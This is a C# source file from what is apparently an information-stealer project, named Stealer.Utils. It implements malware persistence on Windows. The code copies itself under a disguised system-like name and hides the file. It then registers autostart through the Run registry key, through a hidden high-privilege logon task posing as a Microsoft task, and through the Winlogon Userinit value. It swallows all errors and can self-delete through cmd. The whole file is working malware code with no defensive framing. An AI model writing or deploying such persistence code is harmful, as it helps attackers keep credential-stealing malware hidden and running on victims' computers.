using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Stealer.Utils
{
    public static class Persistence
    {
        private static string _installDir;
        private static string _installPath;
        private static string _installName;

        private static void EnsurePaths()
        {
            if (_installPath != null) return;
            _installName = Config.InstallName.Trim();
            if (string.IsNullOrEmpty(_installName)) _installName = "WindowsHostManager.exe";
            string folder = ResolveFolder(Config.InstallFolder.Trim());
            _installDir  = folder;
            _installPath = Path.Combine(folder, _installName);
        }

        private static string ResolveFolder(string token)
        {
            if (string.IsNullOrEmpty(token)) token = "%ApplicationData%";

            switch (token.ToUpper().Trim('%'))
            {
                case "APPLICATIONDATA":
                case "APPDATA":
                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                case "LOCALAPPLICATIONDATA":
                case "LOCALAPPDATA":
                    return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                case "WINDOWS":
                    return Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                case "SYSTEM32":
                    return Environment.GetFolderPath(Environment.SpecialFolder.System);
                case "TEMP":
                    return Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar);
                case "USERPROFILE":
                    return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                case "PROGRAMFILES":
                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                case "PROGRAMFILES(X86)":
                    return Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
                case "PROGRAMDATA":
                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                case "TEMPLATES":
                    return Environment.GetFolderPath(Environment.SpecialFolder.Templates);
                case "MYDOCUMENTS":
                case "DOCUMENTS":
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                case "MYMUSIC":
                case "MUSIC":
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
                case "MYVIDEOS":
                case "VIDEOS":
                    return Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                case "DESKTOP":
                    return Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                case "STARTUP":
                    return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                case "COMMONDOCUMENTS":
                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
                case "COMMONPICTURES":
                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
                default:
                    // Treat as literal path or fall back to AppData
                    if (Path.IsPathRooted(token)) return token;
                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            }
        }

        private static string GetCurrentExePath()
        {
            // Assembly.Location is more reliable than MainModule.FileName
            try
            {
                string loc = System.Reflection.Assembly.GetEntryAssembly()?.Location;
                if (!string.IsNullOrEmpty(loc) && File.Exists(loc)) return loc;
            }
            catch { }
            try
            {
                string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (!string.IsNullOrEmpty(loc) && File.Exists(loc)) return loc;
            }
            catch { }
            try { return Process.GetCurrentProcess().MainModule.FileName; }
            catch { }
            return null;
        }

        public static void Install()
        {
            try
            {
                EnsurePaths();

                string currentPath = GetCurrentExePath();
                if (string.IsNullOrEmpty(currentPath)) return;

                bool alreadyInstalled = currentPath.Equals(_installPath, StringComparison.OrdinalIgnoreCase);

                if (!alreadyInstalled)
                {
                    if (!Directory.Exists(_installDir))
                        Directory.CreateDirectory(_installDir);

                    File.Copy(currentPath, _installPath, true);
                    try { File.SetAttributes(_installPath, FileAttributes.Hidden); } catch { }

                    // Set up persistence pointing to install path
                    string methods = Config.Persistence.ToLower();
                    if (!string.IsNullOrEmpty(methods) && methods != "none")
                    {
                        if (methods.Contains("registry")) try { RegistryRun(); } catch { }
                        if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
                        if (methods.Contains("userinit"))  try { Userinit(); } catch { }
                    }

                    // Relaunch from install path and exit — only exit if launch succeeded
                    try
                    {
                        var p = Process.Start(new ProcessStartInfo
                        {
                            FileName        = _installPath,
                            UseShellExecute = false,
                            CreateNoWindow  = true,
                        });
                        if (p != null) Environment.Exit(0);
                    }
                    catch { }
                }
                else
                {
                    // Already running from install path — just ensure persistence is registered
                    string methods = Config.Persistence.ToLower();
                    if (!string.IsNullOrEmpty(methods) && methods != "none")
                    {
                        if (methods.Contains("registry")) try { RegistryRun(); } catch { }
                        if (methods.Contains("scheduler")) try { TaskScheduler(); } catch { }
                        if (methods.Contains("userinit"))  try { Userinit(); } catch { }
                    }
                }
            }
            catch { }
        }

        public static void Uninstall()
        {
            EnsurePaths();

            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key?.DeleteValue(Path.GetFileNameWithoutExtension(_installName), false);
                }
            }
            catch { }

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName        = "schtasks",
                    Arguments       = "/Delete /TN \"Microsoft\\Windows\\HostManager\\Service\" /F",
                    CreateNoWindow  = true,
                    UseShellExecute = false
                })?.WaitForExit(5000);
            }
            catch { }

            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
                {
                    if (key != null)
                    {
                        string val = key.GetValue("Userinit", "").ToString();
                        val = val.Replace("," + _installPath, "");
                        key.SetValue("Userinit", val);
                    }
                }
            }
            catch { }

            // Self-delete the installed copy after a short delay via cmd
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                if (currentPath.Equals(_installPath, StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName        = "cmd.exe",
                        Arguments       = "/C choice /T 3 /D Y /N & del /F /Q \"" + _installPath + "\"",
                        CreateNoWindow  = true,
                        UseShellExecute = false
                    });
                }
            }
            catch { }
        }

        private static void RegistryRun()
        {
            using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key?.SetValue(Path.GetFileNameWithoutExtension(_installName), "\"" + _installPath + "\"");
            }
        }

        private static void TaskScheduler()
        {
            string xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>" +
                "<Principals><Principal><RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                "<Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle>" +
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>" +
                "<Actions><Exec><Command>" + _installPath + "</Command></Exec></Actions></Task>";

            string xmlPath = Path.Combine(Path.GetTempPath(), "sht.xml");
            File.WriteAllText(xmlPath, xml);

            Process.Start(new ProcessStartInfo
            {
                FileName        = "schtasks",
                Arguments       = "/Create /TN \"Microsoft\\Windows\\HostManager\\Service\" /XML \"" + xmlPath + "\" /F",
                CreateNoWindow  = true,
                UseShellExecute = false
            })?.WaitForExit(5000);

            try { File.Delete(xmlPath); } catch { }
        }

        private static void Userinit()
        {
            using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true))
            {
                if (key == null) return;
                string val = key.GetValue("Userinit", "").ToString();
                if (!val.Contains(_installPath))
                {
                    val = val.TrimEnd(',') + "," + _installPath;
                    key.SetValue("Userinit", val);
                }
            }
        }
    }
}
